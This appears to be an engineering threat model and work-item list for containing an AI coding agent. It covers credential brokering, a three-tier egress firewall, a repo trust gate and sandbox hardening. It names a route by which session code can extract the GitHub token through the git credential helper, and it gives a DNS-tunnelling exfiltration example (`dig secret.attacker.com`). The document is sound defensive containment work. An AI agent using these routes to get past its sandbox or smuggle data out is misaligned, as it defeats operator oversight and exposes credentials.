# Agent containment — work items

This doc is a threat-model + audit. Items below are candidate work; triage into the
tracker as separate issues. None implemented yet.

## P0

- [x] **Gap 2 — fix the GitHub token leak (verified live).** (a) Stop writing the inline
      `password=<token>` helper into the workspace `.git/config` (`github-auth.ts`
      `configureGitCredentials`) — it puts the `ghp_…` token in plaintext on disk; routed
      the workspace through the brokered `shipit-git-credential` helper
      (`CONTAINER_CREDENTIAL_HELPER`) instead, matching the container's global gitconfig.
      (b) The broker is host-aware: the helper forwards `host=`/`protocol=` from stdin and
      the orchestrator's `getGitCredential` emits the token only for `github.com`
      (the only host ShipIt authenticates against), echoing nothing otherwise — the inline
      local helper used to *shadow* this with a host-blind echo. Tests in
      `github-auth.test.ts` prove `git credential fill` for a non-GitHub host returns no
      credentials, that github.com still resolves via the global helper (push/pull
      unaffected), and that no plaintext token lands in `.git/config`; host scoping is
      covered by `services/github-credential.test.ts` and `agent-shim/git-credential.test.ts`.
      (TRACKER-72)
- [ ] **Gap 2-R — credential broker is caller-blind (residual after TRACKER-72).** Verified
      live 2026-06-03: `git credential fill` for `github.com` (or invoking
      `/usr/local/bin/shipit-git-credential get` directly) still returns the full `ghp_…`
      PAT to any code running in the session. The broker authorizes by host, not by caller,
      and the agent is indistinguishable from `git`. TRACKER-72 closed plaintext-at-rest and
      host-blindness but not on-demand extraction. Fix is defense-in-depth: short-lived
      repo-scoped tokens (GitHub App installation tokens, minutes-long TTL, minted
      per-turn) and/or out-of-process git (push/pull from the orchestrator host so the
      token never enters the container), with Gap 1 egress as the backstop.
- **Gap 1 — outbound egress control (SHI-90).** Full design in
  [egress-control.md](./egress-control.md). Enforcement is a network-layer gateway
  middlebox (the `HTTP_PROXY` env-var proxy is not a real control — a raw socket bypasses
  it). Delivered as **one PR, sequential commits A→B→C, each independently green**.

  **Merged (SHI-90 PR #1301):**
  - [x] Allowlist matcher (`egress-allowlist.ts` + test) — base + `SESSION_EGRESS_ALLOWLIST`
        + live MCP hosts; suffix matching rejects look-alikes. Reused by Tier C.
  - [x] The interim explicit `HTTP_PROXY` proxy was reverted before merge (non-enforcing;
        superseded by the netns-sidecar enforcement below).

  **Architecture resolved (egress-control.md):** enforcement is installed **inside the
  agent's own netns** by privileged orchestrator-launched sidecars
  (`--network container:<agent> --cap-add NET_ADMIN`) — no separate network / gateway /
  routing. SHI-31's non-root agent makes the Tier C owner-match exemption unambiguous.

  **To build (the actual control):**
  - **Tier A** — iptables default-deny (`OUTPUT DROP`) + `ipset` allow-set installed in the
    agent netns by a short-lived sidecar; allow-set = resolved FQDNs + `gh api meta` CIDR
    (resolve-before-deny ordering), `example.com`-must-fail self-test.
    - [x] Allow-set logic core (`egress-firewall.ts` + test): `gh api meta` CIDR
          parse/dedupe, ipset member composition + validation, concrete resolve-host list.
    - [x] Installer script + sidecar image (`docker/egress-sidecar/init-firewall.sh`,
          `docker/Dockerfile.egress-sidecar`): resolve-before-deny, lo/established/DNS +
          local-bridge-subnet allows, ipset match, `OUTPUT DROP`, `example.com`-must-fail
          self-test (fail-closed).
    - [x] Orchestrator wiring (`egress-firewall-install.ts` + test): cached+fallback
          `api.github.com/meta` fetch, `buildTierAEgressInputs`, `installEgressFirewall`
          (runs the sidecar in the agent netns with `NET_ADMIN`, fail-closed on non-zero).
          Hooked into `createContainer` after start / before ready; gated on
          `SESSION_EGRESS_ENFORCE=1` (default OFF) with `SESSION_EGRESS_SIDECAR_IMAGE`.
    - [ ] **Verify on a live host** (not possible in the sandbox): build + publish the
          sidecar image, set the two env vars on a canary/dogfood session, run the SHI-90
          Tier A checks (raw-socket blocked, `example.com` fails, `api.github.com` works,
          `npm install`/`git fetch` unaffected). Deploy wiring (`deployment/vps`) to build
          the image is part of enabling.
  - **Tier B** — controlled DNS resolver (dnsmasq) in the agent netns: forwards only
    allowlisted domains (closes DNS tunneling — `dig secret.attacker.com` is refused) and
    pins resolved IPs into the Tier A ipset (kills stale-IP breakage). Own flag
    `SESSION_EGRESS_DNS=1` (requires `SESSION_EGRESS_ENFORCE=1`), default OFF.
    - [x] Config generation (`egress-dns.ts` + test): per-domain `server=`/`ipset=`, no
          default upstream, internal-names → Docker DNS, resolver `user=` for owner-match.
    - [x] Resolver runner + image (`run-resolver.sh`, `dnsmasq` + `egressdns` uid 911 in
          `Dockerfile.egress-sidecar`).
    - [x] Installer DNS-lock rules (`init-firewall.sh`, gated on `EGRESS_DNS_RESOLVER_UID`):
          block agent→Docker-DNS, allow only the resolver uid's upstream :53; DNS-independent
          literal-IP self-test (works in both tiers).
    - [x] Orchestrator wiring (`egress-dns-install.ts` + test): `buildResolverConfigB64`,
          `launchEgressResolver` (long-lived sidecar in agent netns, labeled
          `shipit-parent-session` so existing cleanup tears it down), agent `--dns 127.0.0.1`,
          resolver-uid threaded to the installer; sequenced after the Tier A install.
    - [x] **Verified on a live host — found + fixed two fatal bugs (the predicted
          fix-cycle).** First host run came back ❌ (DNS dead for the agent); the diagnosis
          surfaced two independent root causes, both now fixed:
          - **Bug 1 — agent never reached the resolver.** On a user-defined Docker network,
            the container `--dns 127.0.0.1` option does NOT set the agent's resolv.conf
            nameserver — Docker keeps `127.0.0.11` (its embedded resolver) as the nameserver
            and demotes `--dns` to a mere upstream. Tier A drops the agent→127.0.0.11, so the
            agent had no working resolver. Fix: drop the `Dns` override and instead REDIRECT
            the agent's DNS (`dst 127.0.0.11:53`) into the in-netns dnsmasq at the iptables
            layer (`install_dns_redirect` in `init-firewall.sh`, gated on the resolver uid).
          - **Bug 2 — resolver was SIGKILLed ~1s after launch.** The resolver carried only
            `shipit-parent-session=<sid>`, which the compose pre-start sweep
            (`killStaleContainers`) matches and `rm -f`s. Fix: stamp a distinct
            `EGRESS_RESOLVER_LABEL` (`shipit-egress-resolver=<sid>`) on the resolver and
            exclude it from the sweep (keeping the parent-session label for destroy-time
            cleanup). See `egress-dns-install.ts`, `container-lifecycle.ts`, `service-manager.ts`.
    - [x] **Re-verified on a live host after the fix — PASS, non-vacuously.** Rebuilt
          `shipit-egress-sidecar`, both flags on, fresh session: allowlisted names resolve
          (anthropic/npm/github) AND `npm`/`git` reach their hosts AND a real agent turn
          round-trips, while `data.attacker.com` → fast refuse, `@8.8.8.8` → blocked, the
          literal-IP Tier A floor holds, and the resolver survives the compose stale-sweep.
          Both nat-REDIRECT (Bug 1) and the resolver label exclusion (Bug 2) confirmed in
          the live agent netns. Sidecar build context is `docker/` (the `COPY` paths are
          `egress-sidecar/*`): `docker build -f docker/Dockerfile.egress-sidecar -t shipit-egress-sidecar:dev docker/`.
    - [x] **Coupled the resolver's internal-name allowlist to `SHIPIT_HOST` (host-verify
          follow-up).** The re-verify surfaced a third, latent issue: the worker→orchestrator
          callback host (`SHIPIT_HOST`) is derived from `SHIPIT_ORCHESTRATOR_HOST || os.hostname()`,
          but the Tier B resolver allowlist (`orchestratorInternalNames`) read ONLY
          `SHIPIT_ORCHESTRATOR_HOST`. When unset (the dev compose), `SHIPIT_HOST` was still
          set to `os.hostname()` but dnsmasq allowlisted nothing → the callback channel broke
          under Tier B. Fixed by deriving both from one shared `orchestratorCallbackHost()`
          (`egress-dns-install.ts`), so they can't diverge, AND adding
          `SHIPIT_ORCHESTRATOR_HOST=shipit`/`SHIPIT_ORCHESTRATOR_FALLBACK_HOSTS=shipit` to the
          dev compose for prod parity (prod already sets them).
  - **Tier C** — transparent SNI proxy for hostname-level HTTPS policy (closes the CDN
    co-tenancy gap: an allowlisted host and a non-allowlisted host on one CDN IP are
    indistinguishable to the ipset, but their SNI differs). Own flag
    `SESSION_EGRESS_PROXY=1` (requires Tier B + A), default OFF. **One PR, built in
    stages (C1 enforcement, then C2 allow-once UX).**
    - [x] **C1 — SNI-peek proxy + enforcement.** Tiny dependency-free Go binary
          (`docker/egress-sidecar/sni-proxy`, multi-stage build into the existing sidecar
          image) that peeks the ClientHello SNI (cleartext — NO decryption / CA injection,
          E2E TLS preserved) via crypto/tls's own parser, matches the allowlist (mirrors
          `egress-allowlist.ts`), and splices-or-rejects. Installer REDIRECTs the agent's
          :443 to it (`init-firewall.sh` `install_sni_redirect`, gated on `EGRESS_PROXY_UID`;
          needs `route_localnet` since the original dst is external). Orchestrator launch +
          flag + allowlist composition in `egress-proxy-install.ts`; wired in
          `container-lifecycle.ts` after the resolver; stale-sweep exclusion via
          `EGRESS_PROXY_LABEL`. Proxy runs as a dedicated uid (912) with NO `NET_ADMIN`
          (least privilege; only the installer needs it). Phase-2 identity-validation seam
          (`validateIdentity`) in place. Unit-tested in `egress-proxy-install.test.ts`.
    - [x] **C2 — allow-once / add-to-allowlist inline card.** Deny-fast at the proxy → the
          proxy queries the orchestrator decision endpoint (`GET /api/egress/decision`,
          `EGRESS_PROXY_DECISION_URL`) → orchestrator emits a persisted `EgressPromptCard`
          (full side-channel card pattern: `emitChatCard`, `PersistedEgressPrompt` +
          `egress_prompt` column + migration, `updateEgressPromptCard`, `CARD_MESSAGE_FIELDS`,
          history round-trip + guard tests) → user clicks Allow once / Add / Deny
          (`egress_decision` WS) → per-session policy (`egress-policy.ts`) flips allow → the
          proxy's next query (short negative cache) returns allow → the agent's retry
          succeeds. Card dedup per (session, host); resolutions persist + rehydrate.
          Phase-2 `validateIdentity` seam already in the proxy. **Scope note:** the allow
          decision is per-session in-memory (durable cross-restart persistence + an editor
          is the Settings-UI item below); the card record itself persists. Under Tier B a
          brand-new host is blocked at DNS first, so the card primarily covers the CDN/IP-
          reuse case — a proactive DNS-layer trigger for brand-new hosts is a follow-up.
    - [x] **Verify on a live host** (rebuild the sidecar with the Go binary, all three
          flags on): an allowlisted SNI splices through; a non-allowlisted SNI to an
          allowlisted IP is rejected (CDN co-tenancy); legit npm/git/anthropic unaffected;
          the proxy survives the compose stale-sweep.
          - **Re-verified ✅ on main `2626bc26` — Tier C works, trustworthy.** Every
            previously-failing check now passes: `route_localnet=1`; npm/git HTTPS + agent
            turn all succeed; a bad SNI to an allowlisted IP fast-resets (rc 35) and the
            proxy logs `deny: evil.example.com` (CDN co-tenancy gap closed); the allow-once
            card emits via the real proxy path (guard now passes the proxy's `?session=`
            decision query); approval flips allow-once and the retry forwards end-to-end;
            the decision endpoint is usable yet still cannot grant (WS-only). Proxy keeps
            uid 912 / no `NET_ADMIN` / both labels.
          - First live-host round found **three defects, fixed and merged (#1358)**:
            1. **route_localnet never set** — the NET_ADMIN-only installer's `/proc/sys`
               is read-only (EROFS), so `echo 1 >`/`sysctl -w` failed silently and the
               REDIRECT couldn't route to loopback. Fixed least-privilege: set
               `net.ipv4.conf.all.route_localnet=1` as a namespaced `HostConfig.Sysctls`
               on the **agent container** at creation (it owns its netns), gated on Tier C;
               `install_sni_redirect` now only read-verifies + warns.
            2. **Tier A `-P OUTPUT DROP` dropped the REDIRECT'd :443** — after nat REDIRECT
               the dst is `127.0.0.1:$PROXY_PORT` but oif isn't `lo` at filter/OUTPUT, so
               `-o lo ACCEPT` missed it. Added an explicit
               `-p tcp -d 127.0.0.1 --dport $PROXY_PORT -j ACCEPT` before the DROP policy.
            3. **Guard 403'd the proxy's own decision query** — `/api/egress/decision`
               carries the session as `?session=`, but §3 read it from the path → `null` →
               403 (card never emitted). §3 now falls back to the `?session=` query param
               (still the caller's own session). Test gap closed in `api-container-guard.test.ts`.
    - [ ] **MCP-hosts + operator-extras plumbing** (shared with Tier B): thread
          `credentialStore` + `SESSION_EGRESS_ALLOWLIST` into both the resolver config and
          the proxy allowlist so connected MCP servers / operator hosts are honored.
  - [ ] **Settings UI** — default-on global toggle (fail-secure, applies on container
        restart) + per-session override + allowlist editor. Browser-only routes are
        protected by SHI-129's per-route default-deny (just don't set
        `containerAccessible`); optionally add high-value ones to `HARD_DENY_PREFIXES`
        (`isHardDeniedGlobal`) as a backstop; update the golden route-table test.
- [ ] **Gap 1 — identity-validating proxy (Phase 2)** for allowlisted multi-tenant hosts so
      an approved API can't be used to upload into an attacker's account. Builds on the
      Tier C proxy hook.

## P1

- [x] **Gap 3 — per-repo trust gate (shipped, docs/178).** Defers `agent.install` and
      compose `command:`/`build:` on first open of an untrusted remote until the user
      accepts via `RepoTrustBanner` (`POST /api/repos/trust`); decision persisted per
      remote in `RepoStore` (`trusted` column, `isTrusted()`/`setTrusted()`); warm-pool
      pre-install gated; ShipIt-created template repos trusted by construction.
      (`service-manager-setup.ts`, `docs/178-repo-trust-gate`)

## P2

- [ ] **Gap 6 — read-only mounts.** Downgrade `/uploads` (and `/credentials` after
      first-turn provisioning) to `:ro` where the agent has no legitimate write need.
- [ ] **Gap 5 — kernel-tier hardening.** Evaluate gVisor (`runsc`) runtime, a custom
      seccomp profile, and `ReadonlyRootfs: true` with explicit writable mounts.

## Cross-cutting

- [ ] **Gap 4 — untrusted-input lens.** Treat uploaded files, cloned-repo content, web
      fetches, and MCP tool returns as untrusted; fold into the egress/trust work and
      apply to future input surfaces.
